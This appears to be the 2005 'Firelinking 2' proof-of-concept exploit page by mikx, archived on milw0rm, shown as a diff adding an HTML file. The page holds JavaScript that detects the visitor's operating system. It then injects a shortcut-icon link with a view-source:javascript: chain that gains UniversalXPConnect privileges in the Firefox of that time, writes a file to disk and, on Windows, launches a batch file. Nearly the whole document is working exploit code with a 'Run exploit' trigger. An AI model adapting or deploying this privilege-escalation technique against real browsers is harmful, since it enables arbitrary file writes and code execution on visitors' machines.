@@ -1,0 +1,82 @@
+<html>
+<head>
+<title>Firelinking 2 - Proof-of-Concept by mikx</title>
+
+<-- This PoC is cross platform : On Windows this example creates the file -->
+<-- c:\booom.bat and launches it (opens a dos box with a dir command). On -->
+<-- Linux (tested Fedora Core) and MacOSX the example creates the file -->
+<-- ~/booom.txt or /booom.txt. Depending on caching the the script might -->
+<-- run twice in some cases (this will create an additional booom-1.txt). -->
+
+<link rel="SHORTCUT ICON" href="favicon.ico"> 
+<script language="JavaScript" type="text/javascript">
+var pf = navigator.platform.toLowerCase();
+if (pf.indexOf("win") != -1) {
+var os = "win";
+} else if (pf.indexOf("mac") != -1) {
+var os = "mac";
+} else {
+var os = "linux"
+}
+function runDemo() {
+// this is an ugly caching workaround
+document.getElementById('outhtml').innerHTML = "";
+document.getElementById('outhtml').innerHTML += document.getElementById('clearhtml').value
+document.getElementById('outhtml').innerHTML += document.getElementById('clearhtml').value
+document.getElementById('outhtml').innerHTML += document.getElementById('clearhtml').value
+window.setTimeout("document.getElementById('outhtml').innerHTML += 
+document.getElementById('linkhtml_"+os+"').value",300);
+} 
+</script>
+</head>
+<body>
+<div style="font-family:Verdana;font-size:11px;">
+
+<div style="font-family:Verdana;font-size:15px;font-weight:bold;">Firelinking 2 - Proof-of-Concept</div>
+<br><br>
+<div style="width:600px">
+<div id="outhtml" style="display:none"></div>
+
+<textarea id="clearhtml" style="display:none">
+<link rel="SHORTCUT ICON" href="favicon.ico">
+</textarea>
+
+<textarea id="linkhtml_win" style="display:none">
+<link rel="SHORTCUT ICON" href="view-source:javascript:delayedOpenWindow('
+javascript:netscape.security.PrivilegeManager.enablePrivilege(\'UniversalXPConnect\');
+file=Components.classes[\'@mozilla.org/file/local;1\'].createInstance(Components.interfaces.
+nsILocalFile);file.initWithPath(\'c:\\\\booom.bat\');file.createUnique(Components.interfaces.
+nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\'@mozilla.org/network/
+file-output-stream;1\'].createInstance(Components.interfaces.nsIFileOutputStream);
+outputStream.init(file,0x04|0x08|0x20,420,0);output=\'@ECHO OFF\\n:BEGIN\\nCLS\\nDIR\\n
+PAUSE\\n:END\';outputStream.write(output,output.length);outputStream.close();file.launch();','','')">
+</textarea>
+
+<textarea id="linkhtml_mac" style="display:none">
+<link rel="SHORTCUT ICON" href="view-source:javascript:delayedOpenWindow('javascript:
+netscape.security.PrivilegeManager.enablePrivilege(\'UniversalXPConnect\');file=Components.
+classes[\'@mozilla.org/file/local;1\'].createInstance(Components.interfaces.nsILocalFile);
+file.initWithPath(\'/booom.txt\');file.createUnique(Components.interfaces.nsIFile.
+NORMAL_FILE_TYPE,420);outputStream=Components.classes[\'@mozilla.org/network/
+file-output-stream;1\'].createInstance(Components.interfaces.nsIFileOutputStream);
+outputStream.init(file,0x04|0x08|0x20,420,0);output=\'booom!\';outputStream.write
+(output,output.length);outputStream.close();','','')">
+</textarea>
+
+<textarea id="linkhtml_linux" style="display:none">
+<link rel="SHORTCUT ICON" href="view-source:javascript:delayedOpenWindow('javascript:
+netscape.security.PrivilegeManager.enablePrivilege(\'UniversalXPConnect\');file=Components.
+classes[\'@mozilla.org/file/local;1\'].createInstance(Components.interfaces.nsILocalFile);file.
+initWithPath(\'~/booom.txt\');file.createUnique(Components.interfaces.nsIFile.
+NORMAL_FILE_TYPE,420);outputStream=Components.classes[\'@mozilla.org/network/
+file-output-stream;1\'].createInstance(Components.interfaces.nsIFileOutputStream);
+outputStream.init(file,0x04|0x08|0x20,420,0);output=\'booom!\';outputStream.write
+(output,output.length);outputStream.close();','','')">
+</textarea>
+<br><br>
+<a href="#" onclick="runDemo();runDemo();">Run exploit</a>
+</div>
+</body>
+</html>
+
+# milw0rm.com [2005-05-21]
